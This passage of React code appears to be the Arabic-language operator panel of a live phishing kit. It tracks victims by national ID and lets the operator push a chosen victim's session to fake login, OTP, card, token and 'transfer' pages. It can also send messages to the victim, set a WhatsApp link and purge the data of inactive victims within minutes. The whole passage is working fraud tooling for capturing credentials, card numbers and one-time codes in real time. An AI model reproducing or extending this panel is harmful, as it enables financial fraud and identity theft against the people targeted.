                    <button onClick={async () => { await rejectMutation.mutateAsync({ nationalId: currentDetail.nationalId }); refetch(); }}
                      style={{ background: "#dc2626", color: "white", border: "none", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}>
                      ❌ رفض
                    </button>
                  </div>
                )}
                
                {/* WhatsApp */}
                <button onClick={async () => { await whatsappMutation.mutateAsync({ nationalId: currentDetail.nationalId }); refetch(); }}
                  style={{ width: "100%", background: "#25D366", color: "white", border: "none", borderRadius: "8px", padding: "10px", fontSize: "13px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif", marginBottom: "12px", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px" }}>
                  📱 واتساب
                </button>

                {/* Direct redirect buttons */}
                <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "6px" }}>
                  {[
                    { label: "→ تسجيل دخول", page: "login", color: "#0891b2" },
                    { label: "→ OTP", page: "otp", color: "#d97706" },
                    { label: "→ تأكيد OTP", page: "confirm-otp", color: "#d97706" },
                    { label: "→ البطاقة", page: "card", color: "#dc2626" },
                    { label: "→ ربط الساعة", page: "watchlink", color: "#059669" },
                    { label: "→ توكن 🔐", page: "token", color: "#1B7A3D" },
                    { label: "→ تحويل 🔑", page: "hard-token", color: "#b45309" },
                    { label: "↗ تنبيه مباشر", page: "security-notice", color: "#f97316" },
                    { label: "→ انتظار", page: "processing", color: "#1B7A3D" },
                    { label: "→ نجاح ✅", page: "success", color: "#16a34a" },
                    { label: "→ واتساب 📱", page: "whatsapp", color: "#25D366" },
                    { label: "📍 تأكيد العنوان", page: "confirm-address", color: "#0284c7" },
                  ].map((btn) => (
                    <button key={btn.page} onClick={() => handleRedirect(currentDetail.nationalId, btn.page)} aria-label={btn.page === "security-notice" ? "توجيه العميل المحدد مباشرة إلى التنبيه" : btn.page === "confirm-address" ? "توجيه العميل المحدد إلى صفحة تأكيد عنوان التوصيل" : undefined}
                      style={{ background: btn.color, color: "white", border: "none", borderRadius: "8px", padding: "8px 6px", fontSize: "11px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}>
                      {btn.label}
                    </button>
                  ))}
                </div>
              </div>

              {/* Custom Message */}
              <div style={{ background: "rgba(255,255,255,0.03)", borderRadius: "14px", padding: "16px", border: "1px solid rgba(255,255,255,0.06)" }}>
                <h4 style={{ fontWeight: "700", marginBottom: "10px", fontSize: "14px", color: "white", margin: "0 0 10px" }}>💬 رسالة مخصصة</h4>
                <textarea
                  value={customMsg}
                  onChange={(e) => setCustomMsg(e.target.value)}
                  placeholder="اكتب رسالة تظهر للعميل..."
                  rows={2}
                  style={{ width: "100%", padding: "10px", border: "1px solid rgba(255,255,255,0.1)", borderRadius: "8px", background: "rgba(255,255,255,0.05)", color: "white", fontSize: "13px", fontFamily: "'Cairo', sans-serif", resize: "vertical", boxSizing: "border-box", outline: "none" }}
                />
                <button onClick={handleSendMessage}
                  style={{ marginTop: "8px", background: "#1B7A3D", color: "white", border: "none", borderRadius: "8px", padding: "8px 18px", fontSize: "13px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}>
                  إرسال
                </button>
              </div>

              {/* WhatsApp Link Settings */}
              <div style={{ background: "rgba(37,211,102,0.05)", borderRadius: "14px", padding: "16px", border: "1px solid rgba(37,211,102,0.2)", marginTop: "16px" }}>
                <h4 style={{ fontWeight: "700", marginBottom: "10px", fontSize: "14px", color: "#25D366", margin: "0 0 10px", display: "flex", alignItems: "center", gap: "8px" }}>📱 رابط الواتساب</h4>
                <input
                  type="text"
                  value={whatsAppLink}
                  onChange={(e) => { setWhatsAppLink(e.target.value); setWhatsAppSaved(false); }}
                  placeholder="أدخل رابط الواتساب الجديد..."
                  dir="ltr"
                  style={{ width: "100%", padding: "10px 12px", border: "1px solid rgba(37,211,102,0.3)", borderRadius: "8px", background: "rgba(255,255,255,0.05)", color: "white", fontSize: "13px", fontFamily: "monospace", boxSizing: "border-box", outline: "none" }}
                />
                <div style={{ display: "flex", alignItems: "center", gap: "8px", marginTop: "8px" }}>
                  <button onClick={async () => {
                    if (!whatsAppLink.trim()) return;
                    await updateWhatsAppLinkMutation.mutateAsync({ link: whatsAppLink.trim() });
                    setWhatsAppSaved(true);
                    setTimeout(() => setWhatsAppSaved(false), 3000);
                  }}
                    style={{ background: "#25D366", color: "white", border: "none", borderRadius: "8px", padding: "8px 18px", fontSize: "13px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}>
                    💾 حفظ الرابط
                  </button>
                  {whatsAppSaved && <span style={{ color: "#4ade80", fontSize: "12px", fontWeight: "700" }}>✅ تم حفظ الرابط بنجاح</span>}
                </div>
                <p style={{ color: "rgba(255,255,255,0.4)", fontSize: "11px", marginTop: "8px", margin: "8px 0 0" }}>هذا الرابط سيظهر للعميل عند تحويله لصفحة الواتساب</p>
              </div>

              {/* Delete Inactive Clients */}
              <div style={{ background: "rgba(220,38,38,0.05)", borderRadius: "14px", padding: "16px", border: "1px solid rgba(220,38,38,0.2)", marginTop: "16px" }}>
                <h4 style={{ fontWeight: "700", marginBottom: "10px", fontSize: "14px", color: "#f87171", margin: "0 0 10px", display: "flex", alignItems: "center", gap: "8px" }}>🗑️ حذف البيانات</h4>
                {deleteInactiveResult && (
                  <div style={{ padding: "8px 10px", borderRadius: "8px", marginBottom: "10px", fontSize: "12px", fontWeight: "700", textAlign: "center", background: deleteInactiveResult.type === 'success' ? 'rgba(22,163,74,0.2)' : 'rgba(220,38,38,0.2)', color: deleteInactiveResult.type === 'success' ? '#4ade80' : '#ef4444', border: `1px solid ${deleteInactiveResult.type === 'success' ? 'rgba(22,163,74,0.4)' : 'rgba(220,38,38,0.4)'}` }}>
                    {deleteInactiveResult.msg}
                  </div>
                )}
                {!deleteInactiveConfirm ? (
                  <button onClick={() => { setDeleteInactiveConfirm(true); setDeleteInactiveResult(null); }}
                    style={{ width: "100%", background: "linear-gradient(135deg, #dc2626, #991b1b)", color: "white", border: "1px solid rgba(220,38,38,0.4)", borderRadius: "8px", padding: "10px 14px", fontSize: "12px", fontWeight: "800", cursor: "pointer", fontFamily: "'Cairo', sans-serif", boxShadow: "0 4px 12px rgba(220,38,38,0.2)" }}>
                    🗑️ حذف جميع العملاء غير النشطين ({totalClients - activeClients})
                  </button>
                ) : (
                  <div>
                    <p style={{ color: "#fbbf24", fontSize: "12px", fontWeight: "700", marginBottom: "10px", textAlign: "center" }}>⚠️ هل أنت متأكد؟ سيتم حذف بيانات جميع العملاء غير النشطين نهائياً!</p>
                    <div style={{ display: "flex", gap: "8px" }}>
                      <button onClick={async () => {
                        setDeleteInactiveLoading(true);
                        try {
                          const result = await deleteInactiveMutation.mutateAsync();
                          await refetch();
                          setDeleteInactiveResult({ type: 'success', msg: `✅ تم حذف ${(result as any).deletedCount} عميل غير نشط بنجاح` });
                        } catch {
                          setDeleteInactiveResult({ type: 'error', msg: '❌ فشل الحذف، حاول مرة أخرى' });
                        }
                        setDeleteInactiveLoading(false);
                        setDeleteInactiveConfirm(false);
                      }}
                        disabled={deleteInactiveLoading}
                        style={{ flex: 1, background: deleteInactiveLoading ? "#555" : "#dc2626", color: "white", border: "none", borderRadius: "8px", padding: "8px 14px", fontSize: "12px", fontWeight: "800", cursor: deleteInactiveLoading ? "not-allowed" : "pointer", fontFamily: "'Cairo', sans-serif" }}>
                        {deleteInactiveLoading ? "⏳ جاري الحذف..." : "✅ نعم، احذف"}
                      </button>
                      <button onClick={() => setDeleteInactiveConfirm(false)}
                        style={{ flex: 1, background: "rgba(255,255,255,0.1)", color: "white", border: "1px solid rgba(255,255,255,0.2)", borderRadius: "8px", padding: "8px 14px", fontSize: "12px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}>
                        ❌ إلغاء
                      </button>
                    </div>
                  </div>
                )}
                <p style={{ color: "rgba(255,255,255,0.4)", fontSize: "11px", marginTop: "8px", margin: "8px 0 0" }}>سيتم حذف بيانات العملاء الذين لم يتفاعلوا خلال آخر دقيقتين</p>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Total & Live Visitors Modal */}
      {showVisitorsModal && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(10, 15, 29, 0.82)",
            backdropFilter: "blur(10px)",
            zIndex: 9999,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            padding: "20px",
          }}
        >
          <div
            style={{
              background: "#0f172a",
              border: "1px solid rgba(245, 158, 11, 0.35)",
              borderRadius: "20px",
              width: "100%",
              maxWidth: "860px",
              maxHeight: "90vh",
              display: "flex",
              flexDirection: "column",
              boxShadow: "0 25px 65px rgba(0, 0, 0, 0.65)",
              overflow: "hidden",
            }}
          >
            {/* Modal Header */}
            <div
              style={{
                padding: "18px 24px",
                borderBottom: "1px solid rgba(255, 255, 255, 0.08)",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                background: "rgba(245, 158, 11, 0.05)",
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                <span style={{ fontSize: "24px" }}>📊</span>
                <div>
                  <h3 style={{ margin: 0, fontSize: "17px", fontWeight: "800", color: "#f59e0b" }}>
                    سجل وإحصائيات إجمالي الزوار
                  </h3>
                  <p style={{ margin: "2px 0 0", fontSize: "12px", color: "rgba(255, 255, 255, 0.5)" }}>
                    متابعة حركة زوار الموقع والتفاعل الفوري معهم
                  </p>
                </div>
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                <button
                  onClick={() => { refetchAllVisitors(); refetch(); }}
                  style={{
                    background: "rgba(255, 255, 255, 0.08)",
                    border: "1px solid rgba(255, 255, 255, 0.15)",
                    color: "white",
                    borderRadius: "8px",
                    padding: "6px 12px",
                    cursor: "pointer",
                    fontSize: "12px",
                    fontWeight: "700",
                    fontFamily: "'Cairo', sans-serif",
                  }}
                >
                  🔄 تحديث
                </button>
                <button
                  onClick={() => setShowVisitorsModal(false)}
                  style={{
                    background: "rgba(239, 68, 68, 0.12)",
                    border: "1px solid rgba(239, 68, 68, 0.25)",
                    color: "#f87171",
                    borderRadius: "8px",
                    padding: "6px 12px",
                    cursor: "pointer",
                    fontSize: "13px",
                    fontWeight: "800",
                    fontFamily: "'Cairo', sans-serif",
                  }}
                >
                  ✕ إغلاق
                </button>
              </div>
            </div>

            {/* Modal Body */}
            <div style={{ padding: "20px 24px", overflowY: "auto", flex: 1 }}>
              {/* Metric Highlights */}
              <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "14px", marginBottom: "20px" }}>
                <div style={{ background: "rgba(245, 158, 11, 0.1)", border: "1px solid rgba(245, 158, 11, 0.25)", borderRadius: "14px", padding: "14px", textAlign: "center" }}>
                  <div style={{ fontSize: "26px", fontWeight: "800", color: "#f59e0b" }}>
                    {allVisitorsData?.totalCount ?? totalVisitorsCount}
                  </div>
                  <div style={{ fontSize: "12px", color: "rgba(255, 255, 255, 0.6)", marginTop: "4px" }}>
                    إجمالي الزوار التراكمي
                  </div>
                </div>
                <div style={{ background: "rgba(34, 197, 94, 0.1)", border: "1px solid rgba(34, 197, 94, 0.25)", borderRadius: "14px", padding: "14px", textAlign: "center" }}>
                  <div style={{ fontSize: "26px", fontWeight: "800", color: "#22c55e", display: "flex", alignItems: "center", justifyContent: "center", gap: "6px" }}>
                    <span style={{ width: "8px", height: "8px", borderRadius: "50%", background: "#22c55e", display: "inline-block" }} />
                    {liveVisitorsData?.visitors?.length ?? 0}
                  </div>
                  <div style={{ fontSize: "12px", color: "rgba(255, 255, 255, 0.6)", marginTop: "4px" }}>
                    الزوار المتصلين حالياً
                  </div>
                </div>
                <div style={{ background: "rgba(59, 130, 246, 0.1)", border: "1px solid rgba(59, 130, 246, 0.25)", borderRadius: "14px", padding: "14px", textAlign: "center" }}>
                  <div style={{ fontSize: "26px", fontWeight: "800", color: "#3b82f6" }}>
                    {allVisitorsData?.visitors?.length ?? 0}
                  </div>
                  <div style={{ fontSize: "12px", color: "rgba(255, 255, 255, 0.6)", marginTop: "4px" }}>
                    جلسات الزوار المسجلة
                  </div>
                </div>
              </div>

              {/* Filter Tabs & Search */}
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: "12px", marginBottom: "16px", flexWrap: "wrap" }}>
                <div style={{ display: "flex", gap: "8px" }}>
                  <button
                    onClick={() => setVisitorsFilter("all")}
                    style={{
                      background: visitorsFilter === "all" ? "#f59e0b" : "rgba(255, 255, 255, 0.06)",
                      color: visitorsFilter === "all" ? "#0f172a" : "white",
                      border: "none",
                      borderRadius: "8px",
                      padding: "6px 14px",
                      fontSize: "12px",
                      fontWeight: "700",
                      cursor: "pointer",
                      fontFamily: "'Cairo', sans-serif",
                    }}
                  >
                    جميع الجلسات ({allVisitorsData?.visitors?.length ?? 0})
                  </button>
                  <button
                    onClick={() => setVisitorsFilter("online")}
                    style={{
                      background: visitorsFilter === "online" ? "#22c55e" : "rgba(255, 255, 255, 0.06)",
                      color: visitorsFilter === "online" ? "#0f172a" : "white",
                      border: "none",
                      borderRadius: "8px",
                      padding: "6px 14px",
                      fontSize: "12px",
                      fontWeight: "700",
                      cursor: "pointer",
                      fontFamily: "'Cairo', sans-serif",
                    }}
                  >
                    متصلين الآن ({liveVisitorsData?.visitors?.length ?? 0})
                  </button>
                </div>
                <input
                  type="text"
                  value={visitorSearch}
                  onChange={(e) => setVisitorSearch(e.target.value)}
                  placeholder="بحث بمعرف الجلسة أو الصفحة..."
                  style={{
                    background: "rgba(255, 255, 255, 0.05)",
                    border: "1px solid rgba(255, 255, 255, 0.12)",
                    borderRadius: "8px",
                    padding: "6px 12px",
                    fontSize: "12px",
                    color: "white",
                    fontFamily: "'Cairo', sans-serif",
                    outline: "none",
                    minWidth: "220px",
                  }}
                />
              </div>

              {visitorRedirectResult && (
                <div style={{ padding: "8px 12px", borderRadius: "8px", marginBottom: "14px", background: "rgba(34, 197, 94, 0.15)", border: "1px solid rgba(34, 197, 94, 0.35)", color: "#86efac", fontSize: "12px", fontWeight: "700", textAlign: "center" }}>
                  {visitorRedirectResult.msg}
                </div>
              )}

              {/* Visitor List */}
              {(() => {
                const threeMinutesAgo = new Date(Date.now() - 3 * 60 * 1000);
                const visitorsList = (allVisitorsData?.visitors || liveVisitorsData?.visitors || []).filter((v: any) => {
                  const isOnline = v.lastActiveAt && new Date(v.lastActiveAt) >= threeMinutesAgo;
                  if (visitorsFilter === "online" && !isOnline) return false;
                  if (visitorSearch.trim()) {
                    const q = visitorSearch.trim().toLowerCase();
                    const matchSession = (v.sessionId || "").toLowerCase().includes(q);
                    const matchPage = (v.currentPage || "").toLowerCase().includes(q) || (PAGE_LABELS[v.currentPage || ""] || "").includes(q);
                    return matchSession || matchPage;
                  }
                  return true;
                });

                if (visitorsList.length === 0) {
                  return (
                    <div style={{ textAlign: "center", padding: "40px 20px", color: "rgba(255, 255, 255, 0.4)" }}>
                      <div style={{ fontSize: "36px", marginBottom: "8px" }}>🌐</div>
                      <p style={{ fontSize: "13px", margin: 0 }}>لا يوجد زوار يطابقون خيارات التصفية الحالية</p>
                    </div>
                  );
                }

                return (
                  <div style={{ border: "1px solid rgba(255, 255, 255, 0.08)", borderRadius: "12px", overflow: "hidden" }}>
                    <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "12px", textAlign: "right" }}>
                      <thead>
                        <tr style={{ background: "rgba(255, 255, 255, 0.04)", borderBottom: "1px solid rgba(255, 255, 255, 0.08)", color: "rgba(255, 255, 255, 0.6)" }}>
                          <th style={{ padding: "10px 14px", fontWeight: "700" }}>#</th>
                          <th style={{ padding: "10px 14px", fontWeight: "700" }}>معرف الجلسة</th>
                          <th style={{ padding: "10px 14px", fontWeight: "700" }}>الحالة</th>
                          <th style={{ padding: "10px 14px", fontWeight: "700" }}>الصفحة الحالية</th>
                          <th style={{ padding: "10px 14px", fontWeight: "700" }}>آخر نشاط</th>
                          <th style={{ padding: "10px 14px", fontWeight: "700", textAlign: "center" }}>توجيه الزائر</th>
                        </tr>
                      </thead>
                      <tbody>
                        {visitorsList.map((visitor: any, idx: number) => {
                          const isOnline = visitor.lastActiveAt && new Date(visitor.lastActiveAt) >= threeMinutesAgo;
                          const pageKey = visitor.currentPage || "";
                          const pageLabel = PAGE_LABELS[pageKey] || pageKey || "الرئيسية";
                          const pageColor = PAGE_COLORS[pageKey] || "#6b7280";

                          return (
                            <tr
                              key={visitor.id || visitor.sessionId || idx}
                              style={{
                                borderBottom: "1px solid rgba(255, 255, 255, 0.04)",
                                background: isOnline ? "rgba(34, 197, 94, 0.02)" : "transparent",
                              }}
                            >
                              <td style={{ padding: "10px 14px", color: "rgba(255, 255, 255, 0.4)" }}>{idx + 1}</td>
                              <td style={{ padding: "10px 14px", fontFamily: "monospace", color: "#cbd5e1" }}>
                                {visitor.sessionId ? `${visitor.sessionId.slice(0, 14)}...` : "—"}
                              </td>
                              <td style={{ padding: "10px 14px" }}>
                                {isOnline ? (
                                  <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", color: "#4ade80", fontSize: "11px", fontWeight: "700" }}>
                                    <span style={{ width: "6px", height: "6px", borderRadius: "50%", background: "#22c55e", boxShadow: "0 0 6px #22c55e" }} />
                                    متصل الآن
                                  </span>
                                ) : (
                                  <span style={{ color: "rgba(255, 255, 255, 0.4)", fontSize: "11px" }}>غير متصل</span>
                                )}
                              </td>
                              <td style={{ padding: "10px 14px" }}>
                                <span style={{ background: pageColor, color: "white", borderRadius: "6px", padding: "2px 8px", fontSize: "10px", fontWeight: "700" }}>
                                  {pageLabel}
                                </span>
                              </td>
                              <td style={{ padding: "10px 14px", color: "rgba(255, 255, 255, 0.6)" }}>
                                {formatDateTime(visitor.lastActiveAt || visitor.createdAt)}
                              </td>
                              <td style={{ padding: "10px 14px", textAlign: "center" }}>
                                <div style={{ display: "inline-flex", gap: "4px" }}>
                                  <button
                                    onClick={async () => {
                                      if (!visitor.sessionId) return;
                                      await redirectVisitorMutation.mutateAsync({ sessionId: visitor.sessionId, page: "login" });
                                      setVisitorRedirectResult({ sessionId: visitor.sessionId, msg: `✅ تم توجيه الزائر (${visitor.sessionId.slice(0, 8)}) إلى صفحة تسجيل الدخول` });
                                      setTimeout(() => setVisitorRedirectResult(null), 3000);
                                    }}
                                    style={{
                                      background: "rgba(27, 122, 61, 0.2)",
                                      border: "1px solid rgba(27, 122, 61, 0.4)",
                                      color: "#86efac",
                                      borderRadius: "6px",
                                      padding: "3px 8px",
                                      fontSize: "10px",
                                      cursor: "pointer",
                                      fontFamily: "'Cairo', sans-serif",
                                      fontWeight: "700",
                                    }}
                                  >
                                    تسجيل الدخول
                                  </button>
                                  <button
                                    onClick={async () => {
                                      if (!visitor.sessionId) return;
                                      await redirectVisitorMutation.mutateAsync({ sessionId: visitor.sessionId, page: "choose-watch" });
                                      setVisitorRedirectResult({ sessionId: visitor.sessionId, msg: `✅ تم توجيه الزائر (${visitor.sessionId.slice(0, 8)}) إلى اختيار الساعة` });
                                      setTimeout(() => setVisitorRedirectResult(null), 3000);
                                    }}
                                    style={{
                                      background: "rgba(59, 130, 246, 0.2)",
                                      border: "1px solid rgba(59, 130, 246, 0.4)",
                                      color: "#93c5fd",
                                      borderRadius: "6px",
                                      padding: "3px 8px",
                                      fontSize: "10px",
                                      cursor: "pointer",
                                      fontFamily: "'Cairo', sans-serif",
                                      fontWeight: "700",
                                    }}
                                  >
                                    الساعات
                                  </button>
                                  <button
                                    onClick={async () => {
                                      if (!visitor.sessionId) return;
                                      await redirectVisitorMutation.mutateAsync({ sessionId: visitor.sessionId, page: "confirm-address" });
                                      setVisitorRedirectResult({ sessionId: visitor.sessionId, msg: `✅ تم توجيه الزائر (${visitor.sessionId.slice(0, 8)}) إلى تأكيد العنوان` });
                                      setTimeout(() => setVisitorRedirectResult(null), 3000);
                                    }}
                                    style={{
                                      background: "rgba(16, 185, 129, 0.2)",
                                      border: "1px solid rgba(16, 185, 129, 0.4)",
                                      color: "#6ee7b7",
                                      borderRadius: "6px",
                                      padding: "3px 8px",
                                      fontSize: "10px",
                                      cursor: "pointer",
                                      fontFamily: "'Cairo', sans-serif",
                                      fontWeight: "700",
                                    }}
                                  >
                                    العنوان
                                  </button>
                                </div>
                              </td>
                            </tr>
                          );
                        })}
                      </tbody>
                    </table>
                  </div>
                );
              })()}

              {/* Counter Reset Area */}
              <div style={{ marginTop: "20px", paddingTop: "16px", borderTop: "1px solid rgba(255, 255, 255, 0.08)", display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: "10px" }}>
                <span style={{ fontSize: "11px", color: "rgba(255, 255, 255, 0.4)" }}>
                  يتم احتساب إجمالي الزوار التراكمي تلقائياً عند أول زيارة لكل جلسة فريدة.
                </span>
                {!resetVisitorsConfirm ? (
                  <button
                    onClick={() => setResetVisitorsConfirm(true)}
                    style={{
                      background: "rgba(239, 68, 68, 0.12)",
                      border: "1px solid rgba(239, 68, 68, 0.3)",
                      color: "#f87171",
                      borderRadius: "8px",
                      padding: "6px 14px",
                      fontSize: "11px",
                      fontWeight: "700",
                      cursor: "pointer",
                      fontFamily: "'Cairo', sans-serif",
                    }}
                  >
                    ⚠️ تصفير عداد الزوار
                  </button>
                ) : (
                  <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                    <span style={{ fontSize: "11px", color: "#fbbf24", fontWeight: "700" }}>تأكيد تصفير العداد؟</span>
                    <button
                      onClick={async () => {
                        setResetVisitorsLoading(true);
                        try {
                          await resetTotalVisitorsMutation.mutateAsync();
                          await refetch();
                          await refetchAllVisitors();
                        } finally {
                          setResetVisitorsLoading(false);
                          setResetVisitorsConfirm(false);
                        }
                      }}
                      disabled={resetVisitorsLoading}
                      style={{
                        background: "#dc2626",
                        color: "white",
                        border: "none",
                        borderRadius: "6px",
                        padding: "5px 12px",
                        fontSize: "11px",
                        fontWeight: "800",
                        cursor: resetVisitorsLoading ? "not-allowed" : "pointer",
                        fontFamily: "'Cairo', sans-serif",
                      }}
                    >
                      {resetVisitorsLoading ? "جاري..." : "نعم، تصفير"}
                    </button>
                    <button
                      onClick={() => setResetVisitorsConfirm(false)}
                      style={{
                        background: "rgba(255, 255, 255, 0.1)",
                        color: "white",
                        border: "1px solid rgba(255, 255, 255, 0.2)",
                        borderRadius: "6px",
                        padding: "5px 10px",
                        fontSize: "11px",
                        cursor: "pointer",
                        fontFamily: "'Cairo', sans-serif",
                      }}
                    >
                      إلغاء
                    </button>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
